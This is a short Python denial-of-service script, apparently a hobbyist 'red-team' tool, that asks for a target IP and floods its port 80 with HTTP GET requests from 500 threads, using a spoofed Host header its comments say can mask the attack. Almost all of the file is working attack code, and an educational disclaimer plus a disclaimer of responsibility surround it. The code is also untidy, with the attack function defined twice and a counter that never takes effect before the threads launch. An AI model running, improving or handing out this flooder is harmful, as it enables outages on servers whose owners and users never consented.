#Imported modules
import socket
import threading
import pyfiglet
import colorama
from colorama import Fore
colorama.init()

ascii_banner = pyfiglet.figlet_format("Red-Team fun time")
print(Fore.RED + ascii_banner)

print("DoS Time")
print("""
  .-.    _,  .-.  ,_    .-.
 '-._'--'  \_| |_/  '--'_.-'
     '-._  \ | | /  _.-'
         `-.^| |^.-'
            `\=/`
				- Joan Stark (ASCII Art Archive)""")
print("-" * 50)
print("[*] Disclaimer: This script is to be used only for educational purposes. Do not run script against unauthorized IP's without prior consent.")
print("[*] This script is configured only to attack port 80.")
print("[*] If this program is used by bad actors, we aren't to be held accountable for the repercussions")
print("-" * 50)
target = input("Enter target IP:")
fake_ip = input("Enter host IP:")
#Specifies port to run attack on
port = 80

#Attack is defined with sockets module
#Send HTTP GET requests to target IP
#HOST can be any IP address. Can use fake IP to mask attack
def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()

#Runs 500 threads of the defined attack
#Threads can be set to a higher numebr for more requests.
for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()

attack_num = 0

#Attack output is defined
def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()

#Global allows to modify variable 
		global attack_num
		attack_num += 1
		print(attack_num)

		s.close
